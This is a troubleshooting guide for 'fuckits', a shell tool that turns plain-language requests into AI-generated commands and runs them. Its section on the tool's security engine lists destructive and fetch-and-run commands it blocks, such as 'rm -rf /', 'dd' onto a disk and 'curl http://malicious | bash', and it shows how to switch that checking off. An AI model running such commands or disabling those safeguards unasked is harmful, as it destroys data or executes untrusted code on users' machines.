# fuckits Troubleshooting Guide

This guide helps you diagnose and resolve common issues with fuckits.

---

## Table of Contents

- [Installation Issues](#installation-issues)
- [Configuration Problems](#configuration-problems)
- [Quota and Rate Limiting](#quota-and-rate-limiting)
- [Command Execution Issues](#command-execution-issues)
- [Security Engine Blocks](#security-engine-blocks)
- [API Connection Problems](#api-connection-problems)
- [Debugging Tips](#debugging-tips)

---

## Installation Issues

### Issue: "HOME variable isn't set"

**Symptom:**
```
FUCK! Your HOME variable isn't set. I don't know where to install this shit.
```

**Cause:** The `$HOME` environment variable is not defined.

**Solution:**
```bash
# Set HOME manually
export HOME=/home/yourusername
# Or for root
export HOME=/root

# Then retry installation
curl -sS https://fuckits.25500552.xyz | bash
```

---

### Issue: Script Not Found After Installation

**Symptom:**
```bash
$ fuck install git
bash: fuck: command not found
```

**Cause:** Shell profile not reloaded or installation incomplete.

**Solution:**
```bash
# 1. Reload your shell configuration
source ~/.bashrc  # For bash
source ~/.zshrc   # For zsh

# 2. Or restart your terminal

# 3. Verify installation
ls -la ~/.fuck/main.sh

# 4. If file doesn't exist, reinstall
curl -sS https://fuckits.25500552.xyz | bash
```

---

### Issue: Permission Denied During Installation

**Symptom:**
```
mkdir: cannot create directory '/home/user/.fuck': Permission denied
```

**Cause:** Insufficient write permissions to home directory.

**Solution:**
```bash
# Check home directory permissions
ls -ld ~

# Fix permissions (if you own the directory)
chmod 755 ~

# Or install to alternative location
export HOME=/tmp
curl -sS https://fuckits.25500552.xyz | bash
```

---

## Configuration Problems

### Issue: Config File Validation Failed

**Symptom:**
```
FUCK! Unsafe config file: dangerous shell metacharacter at line 5
```

**Cause:** Config file contains prohibited shell metacharacters for security.

**Solution:**
```bash
# 1. Check your config file
cat ~/.fuck/config.sh

# 2. Remove any lines with:
#    - Command substitution: $(...) or `...`
#    - Pipes, redirections: | > < &
#    - Semicolons, command chaining: ; && ||

# 3. Valid config format:
export FUCK_OPENAI_API_KEY="sk-..."
export FUCK_OPENAI_MODEL="gpt-4o-mini"

# 4. Invalid examples:
# export FUCK_API_KEY=$(cat secret.txt)  # ❌ Command substitution
# export FUCK_DEBUG=true; echo "test"     # ❌ Command chaining
```

---

### Issue: Config File Ignored

**Symptom:** Settings in `~/.fuck/config.sh` don't take effect.

**Cause:** File permissions prevent sourcing or syntax errors.

**Solution:**
```bash
# 1. Check file permissions
ls -l ~/.fuck/config.sh
# Should be: -rw------- (600)

# 2. Fix permissions
chmod 600 ~/.fuck/config.sh

# 3. Validate syntax
bash -n ~/.fuck/config.sh

# 4. Test manually
source ~/.fuck/config.sh
echo $FUCK_OPENAI_API_KEY

# 5. Reload shell
source ~/.bashrc
```

---

## Quota and Rate Limiting

### Issue: Quota Exceeded (429 Error)

**Symptom:**
```
FUCK! Shared demo quota exhausted (10 calls per day).
0 calls left for today.

Switch to your own key: run fuck config and set FUCK_OPENAI_API_KEY
```

**Cause:** Shared Worker demo limit reached (10 requests/day per IP).

**Solution:**

**Option 1: Use Your Own API Key (Recommended)**
```bash
# 1. Run config helper
fuck config

# 2. Edit config file
vim ~/.fuck/config.sh

# 3. Add your OpenAI API key
export FUCK_OPENAI_API_KEY="sk-..."

# Optional: Customize model and endpoint
export FUCK_OPENAI_MODEL="gpt-4o-mini"
export FUCK_OPENAI_API_BASE="https://api.openai.com/v1"

# 4. Reload configuration
source ~/.bashrc

# 5. Verify (should show "Using your local API key...")
fuck install git
```

**Option 2: Wait for Reset**
- Quota resets daily at UTC midnight
- Check remaining quota: Monitor the output after each command

**Option 3: Request Admin Key** (For Trusted Users)
```bash
# If you're a project maintainer/contributor
# Add to ~/.fuck/config.sh
export FUCK_ADMIN_KEY="adm-..."

# This bypasses shared quota limits
```

---

### Issue: Quota Not Resetting

**Symptom:** After UTC midnight, quota still shows 0 remaining.

**Cause:** KV cache propagation delay or local cache issue.

**Solution:**
```bash
# 1. Wait 60 seconds for KV propagation

# 2. Clear local cache (if using in-memory mode)
# Restart the Worker or wait for process restart

# 3. Verify quota storage
# Check Cloudflare dashboard → Workers → KV namespaces

# 4. Test with different IP (VPN/proxy)
curl -X POST https://fuckits.25500552.xyz \
  -H "Content-Type: application/json" \
  -d '{"sysinfo":"OS=Linux","prompt":"test"}'
```

---

## Command Execution Issues

### Issue: AI Returns Empty Command

**Symptom:**
```
FUCK! The AI returned an empty command.
```

**Cause:** AI model unable to generate valid command from prompt.

**Solution:**
```bash
# 1. Rephrase your prompt more clearly
# Bad:  fuck do the thing
# Good: fuck install docker

# 2. Be more specific
# Bad:  fuck fix network
# Good: fuck restart network service

# 3. Include context
# Bad:  fuck update
# Good: fuck update all system packages

# 4. Enable debug mode
export FUCK_DEBUG=true
fuck install git
```

---

### Issue: Command Fails to Execute

**Symptom:**
```
✅ Executing...
FUCK! Command failed with exit code 1.
```

**Cause:** Generated command has errors or insufficient permissions.

**Solution:**
```bash
# 1. Review the command before executing
# When prompted "Execute? [Y/n]", check the command carefully

# 2. Check if sudo is needed
# The AI may generate: apt install git
# But you need:      sudo apt install git

# 3. Verify system info detection
# Enable debug to see what system info is sent to AI
export FUCK_DEBUG=true
fuck install package

# 4. Manually test the command
ls -la  # Copy the AI-generated command and test it

# 5. Check command syntax
# If command looks wrong, report it as an issue
```

---

## Security Engine Blocks

### Issue: Command Blocked by Security Policy

**Symptom:**
```
❌ SECURITY BLOCK: Recursive delete targeting root filesystem
Execution denied. Adjust FUCK_SECURITY_MODE or whitelist the command if absolutely necessary.
```

**Cause:** Security engine detected dangerous pattern (rm -rf /, dd, etc.).

**Solution:**

**Option 1: Review and Approve (Safest)**
```bash
# The command is likely dangerous - DO NOT proceed unless you know what you're doing
# Example blocked commands:
# - rm -rf /
# - dd if=/dev/zero of=/dev/sda
# - curl http://malicious | bash
```

**Option 2: Adjust Security Mode** (Use with Caution)
```bash
# In ~/.fuck/config.sh
# Options: strict, balanced (default), off

# Strict mode (blocks more commands)
export FUCK_SECURITY_MODE="strict"

# Balanced mode (default)
export FUCK_SECURITY_MODE="balanced"

# Disable security (NOT RECOMMENDED)
export FUCK_SECURITY_MODE="off"
```

**Option 3: Whitelist Specific Command**
```bash
# In ~/.fuck/config.sh
# Add command patterns you trust (use carefully!)
export FUCK_SECURITY_WHITELIST="rm -rf /tmp/safe-dir,docker rm -f"
```

---

### Issue: Security Challenge Phrase Required

**Symptom:**
```
⚠️  SECURITY CHALLENGE: Remote script execution via curl pipeline
Type the following phrase to continue:
I accept the risk
```

**Cause:** Command uses risky patterns (curl | bash, eval, etc.).

**Solution:**
```bash
# 1. Review the command carefully
# Example: curl https://get.docker.com | bash

# 2. Understand the risks
# - Remote script execution can be dangerous
# - Only proceed if you trust the source

# 3. Type the exact phrase (case-sensitive)
> I accept the risk

# 4. Or customize the challenge phrase
# In ~/.fuck/config.sh
export FUCK_SECURITY_CHALLENGE_TEXT="我确认接受风险"
```

---

## API Connection Problems

### Issue: Failed to Reach the Shared Worker

**Symptom:**
```
FUCK! Failed to reach the shared Worker.
```

**Cause:** Network connectivity issues or Worker is down.

**Solution:**
```bash
# 1. Check internet connection
ping 8.8.8.8

# 2. Verify Worker is accessible
curl https://fuckits.25500552.xyz/health

# 3. Check if behind proxy/firewall
export http_proxy=http://proxy.example.com:8080
export https_proxy=http://proxy.example.com:8080

# 4. Test with verbose curl
curl -v https://fuckits.25500552.xyz/health

# 5. Use custom endpoint (if self-hosting)
# In ~/.fuck/config.sh
export FUCK_API_ENDPOINT="https://your-domain.workers.dev/"
```

---

### Issue: OpenAI API Error

**Symptom:**
```
FUCK! Local API request failed.
```

**Cause:** Invalid API key, quota exceeded, or API downtime.

**Solution:**
```bash
# 1. Verify your API key
# Check on https://platform.openai.com/api-keys

# 2. Test API key manually
curl https://api.openai.com/v1/models \
  -H "Authorization: Bearer sk-..." \
  | jq .

# 3. Check OpenAI status
# Visit https://status.openai.com

# 4. Verify API base URL
# In ~/.fuck/config.sh
export FUCK_OPENAI_API_BASE="https://api.openai.com/v1"

# 5. Try different model
export FUCK_OPENAI_MODEL="gpt-3.5-turbo"

# 6. Check billing/quota on OpenAI dashboard
```

---

## Debugging Tips

### Enable Debug Mode

```bash
# In ~/.fuck/config.sh
export FUCK_DEBUG=true

# Or temporarily
FUCK_DEBUG=true fuck install git
```

Debug output includes:
- API endpoints being called
- Payload sent to AI
- System information detected
- Response parsing steps

---

### Check System Information

```bash
# View detected system info
export FUCK_DEBUG=true
fuck install test 2>&1 | grep "sysinfo"

# Manual system detection
source ~/.fuck/main.sh
_fuck_collect_sysinfo_string
```

---

### Test Configuration

```bash
# 1. View current config
fuck config

# 2. Test config file syntax
bash -n ~/.fuck/config.sh

# 3. Check what's being loaded
source ~/.fuck/config.sh
env | grep FUCK_
```

---

### Inspect Cache

```bash
# View cached system info
cat ~/.fuck/.sysinfo.cache

# Clear cache (forces re-detection)
rm ~/.fuck/.sysinfo.cache
```

---

### Check Logs

```bash
# If audit logging is enabled
cat ~/.fuck/.audit.log

# View recent commands
tail -20 ~/.fuck/.audit.log
```

---

### Verify Installation

```bash
# Check installed files
ls -la ~/.fuck/
# Should contain: main.sh, config.sh, .sysinfo.cache

# Check file permissions
ls -l ~/.fuck/config.sh
# Should be: -rw------- (600)

# Verify shell profile integration
grep "source.*\.fuck" ~/.bashrc ~/.zshrc 2>/dev/null
```

---

## Getting Help

If you've tried these solutions and still have issues:

1. **Check GitHub Issues**: https://github.com/Silentely/fuckits/issues
2. **Enable Debug Mode**: Collect debug output
3. **File a Bug Report**: Include:
   - Error message (full output)
   - Debug log output
   - System information (OS, shell version)
   - Steps to reproduce
4. **Community Support**: Discord/Telegram (if available)

---

## Quick Reference

### Common Commands

```bash
# View configuration
fuck config

# Uninstall
fuck uninstall

# Enable debug
export FUCK_DEBUG=true

# Check health
curl https://fuckits.25500552.xyz/health

# Test API key
curl https://api.openai.com/v1/models \
  -H "Authorization: Bearer $FUCK_OPENAI_API_KEY"
```

### Important Files

- Configuration: `~/.fuck/config.sh`
- Main script: `~/.fuck/main.sh`
- System cache: `~/.fuck/.sysinfo.cache`
- Audit log: `~/.fuck/.audit.log`
- Shell profile: `~/.bashrc` or `~/.zshrc`

### Environment Variables

```bash
FUCK_OPENAI_API_KEY       # Your OpenAI API key
FUCK_ADMIN_KEY            # Admin bypass key
FUCK_OPENAI_MODEL         # AI model name
FUCK_OPENAI_API_BASE      # API base URL
FUCK_API_ENDPOINT         # Worker endpoint
FUCK_ALIAS                # Custom command alias
FUCK_AUTO_EXEC            # Skip confirmation (true/false)
FUCK_TIMEOUT              # Request timeout (seconds)
FUCK_DEBUG                # Enable debug mode (true/false)
FUCK_SECURITY_MODE        # Security level (strict/balanced/off)
FUCK_SECURITY_WHITELIST   # Trusted command patterns
```
